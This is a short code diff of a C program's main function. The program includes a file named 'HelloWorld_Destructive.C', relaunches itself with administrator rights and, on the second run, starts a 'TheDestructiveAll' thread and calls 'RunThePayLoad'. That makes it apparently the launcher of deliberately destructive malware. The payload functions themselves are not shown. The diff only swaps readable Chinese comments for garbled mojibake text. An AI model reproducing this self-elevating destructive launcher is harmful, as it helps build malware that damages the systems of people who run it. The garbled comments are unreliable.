@@ -2,12 +2,12 @@
 #include"./HelloWorld_Destructive.C"
 #include<process.h>
 int main(int argc, char* argv[]) {
-	if (argc == 1) //初次运行，即双击EXE
+	if (argc == 1) //鍒濇杩愯锛屽嵆鍙屽嚮EXE
 	{
 		Admin_Run(argv[0], "2");
 		return 1;
 	}
-	else if (argc == 2) //再次运行,即上面那个Admin_Run
+	else if (argc == 2) //鍐嶆杩愯,鍗充笂闈㈤偅涓狝dmin_Run
 	{
 		_beginthread(TheDestructiveAll,0, NULL);
 		RunThePayLoad();
